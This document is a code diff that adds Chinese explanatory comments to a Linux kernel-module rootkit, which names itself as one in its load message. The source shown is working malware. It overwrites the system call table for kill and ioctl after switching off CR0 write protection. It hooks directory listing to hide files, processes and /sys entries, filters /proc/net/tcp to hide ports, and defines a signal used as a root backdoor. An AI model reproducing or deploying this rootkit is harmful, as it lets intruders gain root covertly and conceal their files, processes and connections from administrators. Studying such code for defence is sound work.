@@ -32,27 +32,25 @@
     #include <linux/fdtable.h>
 #endif
 
-MODULE_LICENSE("GPL");
-#define SIGFLIP 50
-#define SIGROOT 51
+MODULE_LICENSE("GPL"); //模块许可证声明
+#define SIGFLIP 50 //隐藏模块的信号
+#define SIGROOT 51 //root后门的信号
 
-#define COMMON_PATH "/"
+#define COMMON_PATH "/" //普通的目录 除/proc /sys /dev /run以外的目录（递归）
 #define PROC_PATH "/proc"
 #define SYS_PATH "/sys"
 #define TCP_IPV4_PATH "/proc/net/tcp"
-#define MAX_SECRET_FILES 12
-#define MAX_SECRET_DEVS 4
-#define IOCTL_FILECMD 0xfffffffe
-#define IOCTL_PORTHIDE 0xfffffffd
-#define IOCTL_PORTUNHIDE 0xfffffffc
+#define IOCTL_FILECMD 0xfffffffe //隐藏文件的信号
+#define IOCTL_PORTHIDE 0xfffffffd //端口隐藏
+#define IOCTL_PORTUNHIDE 0xfffffffc //端口显示
 #define HIDE_FILE 1
 #define UNHIDE_FILE 2
 #define HIDE_PROC 3
 #define UNHIDE_PROC 4
 #define HIDE_SYS 5
 #define UNHIDE_SYS 6
-#define NEEDLE_LEN 6
-#define TMPSZ 150
+#define NEEDLE_LEN 6 //端口号长度 最多是5位数字
+#define TMPSZ 150 // /proc/net/tcp每行记录为149
 
 
 #define SYS_CALL_TABLE \
@@ -92,25 +90,38 @@ asmlinkage long new_ioctl(int fd, int cmd, long arg);
 asmlinkage int (*org_seq_show)(struct seq_file *m, void *v);
 asmlinkage int new_seq_show(struct seq_file *seq, void *v); 
 
-void hook_file_op(const char *path, file_iterate new, file_iterate *old);
-void hook_afinfo_seq_op(const char *path, seq_file_show new, seq_file_show *old);
+void hook_file_op(const char *path, file_iterate new, file_iterate *old); //hook file_opration结构体的iterate
+void hook_afinfo_seq_op(const char *path, seq_file_show new, seq_file_show *old); //hook seq_file的show函数
 
 void enable_write(void){
     write_cr0(read_cr0() & (~0x10000));
     return;
 }
+//关闭写保护
 
 void disable_write(void){
     write_cr0(read_cr0() | 0x10000);
     return;
 }
+//开启写保护
 
+
+/* * *
+ * 
+ * 借助内核的链表 struct list_head
+ * 定义一个链表去存储 需要隐藏的文件的inode信息
+ * 定义了添加和删除结点的操作
+ * common_node_head 头指针
+ * common_node_pos 用在之后 list_for_each遍历
+ * tmp_common_node_pos 用在之后 list_for_each_safe遍历
+ * 
+ * * */
 struct common_node{
     unsigned long hide_ino;
     struct list_head list;
 };
 
-LIST_HEAD(common_node_head);
+LIST_HEAD(common_node_head); //初始化头指针
 
 struct list_head *common_node_pos;
 struct list_head *tmp_common_node_pos;
@@ -122,13 +133,13 @@ int common_node_add(unsigned long h_ino){
     tmp_common_node = kmalloc(sizeof(struct common_node),GFP_KERNEL);
     tmp_common_node->hide_ino = h_ino;
     printk("add common ino: %lu\n", h_ino);
-    list_add_tail(&(tmp_common_node->list), &common_node_head);
+    list_add_tail(&(tmp_common_node->list), &common_node_head); //尾部添加一个node
     return 0;
 }
 
 void common_node_delete(unsigned long h_ino){
     list_for_each_safe(common_node_pos, tmp_common_node_pos, &common_node_head){
-        tmp_common_node = list_entry(common_node_pos,struct common_node,list);
+        tmp_common_node = list_entry(common_node_pos,struct common_node,list); //获得当前位置的node
         if (tmp_common_node->hide_ino == h_ino)
             {
                 printk("delete common ino: %lu\n", h_ino);
@@ -138,12 +149,24 @@ void common_node_delete(unsigned long h_ino){
     }
     return;
 }
+/* * *
+ * 
+ * 结束common_node的定义
+ * 
+ * * */
 
-asmlinkage int new_common_iterate(struct file *filp, struct dir_context *ctx);
-file_iterate org_common_iterate;
+asmlinkage int new_common_iterate(struct file *filp, struct dir_context *ctx); //用来hook iterate的
+file_iterate org_common_iterate; //用函数指针存储原始的iterate函数的地址
 asmlinkage int new_common_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);
-file_filldir org_common_filldir;
+//用来hook filldir的
+file_filldir org_common_filldir; //用函数指针存储原始的filldir函数的地址
 
+/* * *
+ * 
+ * 和common_node一样的方式定义
+ * 用来存储要隐藏的进程
+ * 
+ * * */
 struct proc_node{
     unsigned long hide_ino;
     struct list_head list;
@@ -177,12 +200,24 @@ void proc_node_delete(unsigned long h_ino){
     }
     return;
 }
+/* * *
+ * 
+ * 结束proc_node的定义
+ * 下面函数和函数指针的定义也同上
+ * 
+ * * */
 
 asmlinkage int new_proc_iterate(struct file *filp, struct dir_context *ctx);
 file_iterate org_proc_iterate;
 asmlinkage int new_proc_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);
 file_filldir org_proc_filldir;
 
+/* * *
+ * 
+ * 和common_node一样的方式定义
+ * 用来存储要隐藏的/sys目录下的文件
+ * 
+ * * */
 struct sys_node{
     unsigned long hide_ino;
     struct list_head list;
@@ -216,12 +251,24 @@ void sys_node_delete(unsigned long h_ino){
     }
     return;
 }
+/* * *
+ * 
+ * 结束sys_node的定义
+ * 下面函数和函数指针的定义也同上
+ * 
+ * * */
 
 asmlinkage int new_sys_iterate(struct file *filp, struct dir_context *ctx);
 file_iterate org_sys_iterate;
 asmlinkage int new_sys_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);
 file_filldir org_sys_filldir;
 
+/* * *
+ * 
+ * 大体和common_node的定义一样
+ * 区别在于node里面不再是inode信息，而是port信息
+ * 
+ * * */
 struct port_node{
     long port;
     struct list_head list;
@@ -255,6 +302,11 @@ void port_node_delete(long port){
     }
     return;
 }
+/* * *
+ * 
+ * 结束port_node的定义
+ * 
+ * * */
 
 struct ksym {
     char *name;
@@ -416,6 +468,21 @@ asmlinkage int new_kill(pid_t pid, int sig){
     return 0;
 }
 
+/* * *
+ * 
+ * hoot SYS_IOCTL来和client通信
+ * fd参数来对应一个文件
+ * cmd命令 IOCTL_FILECMD IOCTL_PORTHIDE IOCTL_PORTUNHIDE三种
+ * arg参数 IOCTL_FILECMD---HIDE_FILE
+ *                       |-UNHIDE_FILE
+ *                       |-HIDE_PROC
+ *                       |-UNHIDE_PROC
+ *                       |-HIDE_SYS
+ *                       |-UNHIDE_SYS
+ *        IOCTL_PORTHIDE port
+ *        IOCTL_PORTUNHIDE port
+ * 
+ * * */
 asmlinkage long new_ioctl(int fd, int cmd, long arg)
 {
     int ret=0;
@@ -441,6 +508,7 @@ asmlinkage long new_ioctl(int fd, int cmd, long arg)
     file = fget(fd);
     entry =file->f_path.dentry;
     inode = entry->d_inode;
+    //inode的获取可以看看file结构体 可以直接获取 也可以通过dentry去拿
 
     switch(arg)
     {
@@ -494,10 +562,10 @@ void hook_file_op(const char *path, file_iterate new, file_iterate *old) {
     if (IS_ERR(filp)) {
         old = NULL;
     } else {
-        f_op = (struct file_operations *)filp->f_op;
-        *(file_iterate *)old = f_op->iterate;
+        f_op = (struct file_operations *)filp->f_op; //获取file_oprations结构体
+        *(file_iterate *)old = f_op->iterate; //把原始的iterate放到old里存
         enable_write();
-        f_op->iterate = new;
+        f_op->iterate = new; //把自己的函数给iterate
         disable_write();
     }
 }
@@ -505,11 +573,11 @@ void hook_file_op(const char *path, file_iterate new, file_iterate *old) {
 
 asmlinkage int new_common_iterate(struct file *filp, struct dir_context *ctx)
 {
-    org_common_filldir = ctx->actor;
+    org_common_filldir = ctx->actor; //actor是filldir的函数指针
     enable_write();
     *(filldir_t *)&ctx->actor = new_common_filldir;
     disable_write();
-    return org_common_iterate(filp, ctx);
+    return org_common_iterate(filp, ctx); //hook完调用原来的逻辑继续执行
 }
 asmlinkage int new_common_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type)
 {
@@ -518,11 +586,21 @@ asmlinkage int new_common_filldir(struct dir_context *ctx, const char *name, int
     list_for_each(common_node_pos, &common_node_head){
         tmp_common_node = list_entry(common_node_pos,struct common_node,list);
         if(d_ino == tmp_common_node->hide_ino){
-            return 0;
+            return 0; //如果当前文件的inode在要隐藏的链表中，直接return，不再后续处理
         }
     }
-    return org_common_filldir(ctx, name, namlen, offset, ino, d_type);
+    return org_common_filldir(ctx, name, namlen, offset, ino, d_type); //hook完调用原来的逻辑继续执行
 }
+
+/* * *
+ * 
+ * new_proc_iterate
+ * new_proc_filldir
+ * new_sys_iterate
+ * new_sys_filldir
+ * 和上面的一样，只是实现对不同目录的hook
+ * 
+ * * */
 asmlinkage int new_proc_iterate(struct file *filp, struct dir_context *ctx)
 {
     org_proc_filldir = ctx->actor;
@@ -564,6 +642,7 @@ asmlinkage int new_sys_filldir(struct dir_context *ctx, const char *name, int na
     return org_sys_filldir(ctx, name, namlen, offset, ino, d_type);
 }
 
+//调试函数 打印每个一级目录的iterate etc: / /etc /dev /var .....
 void display_iterate(const char* path){
     struct file *f;
     f = filp_open(path, O_RDONLY, 0);
@@ -573,30 +652,31 @@ void display_iterate(const char* path){
     return;
 }
 
+
 void hook_afinfo_seq_op(const char *path, seq_file_show new, seq_file_show *old) {
     struct file *filp;                                      
-    struct tcp_seq_afinfo *afinfo;                                     
+    struct tcp_seq_afinfo *afinfo; //有一个seq_oprations对象来获取show函数                                   
     filp = filp_open(path, O_RDONLY, 0);                    
     if (IS_ERR(filp)) {                  
         old = NULL;                                         
     }                                                        
     afinfo = PDE_DATA(filp->f_path.dentry->d_inode);
-    *(seq_file_show *)old = afinfo->seq_ops.show;
+    *(seq_file_show *)old = afinfo->seq_ops.show; //原始show
     enable_write();
-    afinfo->seq_ops.show = new;
+    afinfo->seq_ops.show = new; //自己定义的show
     disable_write();
     filp_close(filp, 0);
 }
 
 int new_seq_show(struct seq_file *seq, void *v) {
     int ret=0;
-    char needle[NEEDLE_LEN];
-    ret = org_seq_show(seq, v);
+    char needle[NEEDLE_LEN]; //存端口号
+    ret = org_seq_show(seq, v); //调用原始的show函数先缓存区写一行
     list_for_each(port_node_pos, &port_node_head){
         tmp_port_node = list_entry(port_node_pos,struct port_node,list);
-        snprintf(needle, NEEDLE_LEN, ":%04X", tmp_port_node->port);
-        if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) {
-            seq->count -= TMPSZ;
+        snprintf(needle, NEEDLE_LEN, ":%04X", tmp_port_node->port); //转换成/proc/net/tcp格式的port形式
+        if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) { //如果缓冲区的最新一行中包含指定的port
+            seq->count -= TMPSZ; //从缓冲区删除这行
             break;
         }
     }
@@ -606,26 +686,27 @@ int new_seq_show(struct seq_file *seq, void *v) {
 static int lkm_init(void)
 {
     printk("rootkit module loaded\n");
-    //INIT_LIST_HEAD(pathnode_head);
     sct = (unsigned long *)find_sys_call_table();
     if(!sct) sct = (unsigned long *)get_symbol(SYS_CALL_TABLE);
     if(!sct) sct = (unsigned long *)generic_find_sys_call_table();          
     if(!sct) return -1;
-    //obtain syscall addr
+    //获取syscall的地址
     org_kill = (void *)sct[__NR_kill];
     org_ioctl = (void *)sct[__NR_ioctl];
-    //save origin kill addr
+    //保留 kill ioctl的原始地址
     hook_file_op(COMMON_PATH, new_common_iterate, &org_common_iterate);
+    //hook 普通的目录
     hook_file_op(PROC_PATH, new_proc_iterate, &org_proc_iterate);
+    //hook /proc目录
     hook_file_op(SYS_PATH, new_sys_iterate, &org_sys_iterate);
+    //hook /sys目录
     hook_afinfo_seq_op(TCP_IPV4_PATH, new_seq_show, &org_seq_show);
+    //hook tcp ipv4的show函数
     enable_write();
-    //disable write protect
     sct[__NR_kill] = (unsigned long)new_kill;
     sct[__NR_ioctl] = (unsigned long)new_ioctl;
-    //hook kill 
+    //hook kill ioctl
     disable_write();
-    //enable write protect
     return 0;    
 }
  
@@ -634,24 +715,27 @@ static void lkm_exit(void)
     if(org_kill){
         enable_write();
         sct[__NR_kill] = (unsigned long)org_kill;
+        // 还原kill
         disable_write();
     }
     if(org_ioctl){
         enable_write();
         sct[__NR_ioctl] = (unsigned long)org_ioctl;
+        // 还原ioctl
         disable_write();
     }
     if (org_common_iterate) {
         void *dummy;
-        hook_file_op(COMMON_PATH, org_common_iterate, &dummy);
+        hook_file_op(COMMON_PATH, org_common_iterate, &dummy); // 还原普通目录
         list_for_each_safe(common_node_pos, tmp_common_node_pos, &common_node_head) {
             tmp_common_node = list_entry(common_node_pos,struct common_node,list);
             list_del(&(tmp_common_node->list));
+            // 清空普通目录的链表 删除结点一定要用list_for_each_safe
         }
     }
     if (org_proc_iterate) {
         void *dummy;
-        hook_file_op(PROC_PATH, org_proc_iterate, &dummy);
+        hook_file_op(PROC_PATH, org_proc_iterate, &dummy); // 还原/proc目录
         list_for_each_safe(proc_node_pos, tmp_proc_node_pos, &proc_node_head) {
             tmp_proc_node = list_entry(proc_node_pos,struct proc_node,list);
             list_del(&(tmp_proc_node->list));
@@ -659,7 +743,7 @@ static void lkm_exit(void)
     }
     if (org_sys_iterate) {
         void *dummy;
-        hook_file_op(SYS_PATH, org_sys_iterate, &dummy);
+        hook_file_op(SYS_PATH, org_sys_iterate, &dummy); // 还原/sys目录
         list_for_each_safe(sys_node_pos, tmp_sys_node_pos, &sys_node_head) {
             tmp_sys_node = list_entry(sys_node_pos,struct sys_node,list);
             list_del(&(tmp_sys_node->list));
@@ -667,7 +751,7 @@ static void lkm_exit(void)
     }
     if (org_seq_show) {
         void *dummy;
-        hook_afinfo_seq_op(TCP_IPV4_PATH, org_seq_show, &dummy);
+        hook_afinfo_seq_op(TCP_IPV4_PATH, org_seq_show, &dummy); // 还原 tcp ipv4的show
         list_for_each_safe(port_node_pos, tmp_port_node_pos, &port_node_head) {
             tmp_port_node = list_entry(port_node_pos,struct port_node,list);
             list_del(&(tmp_port_node->list));
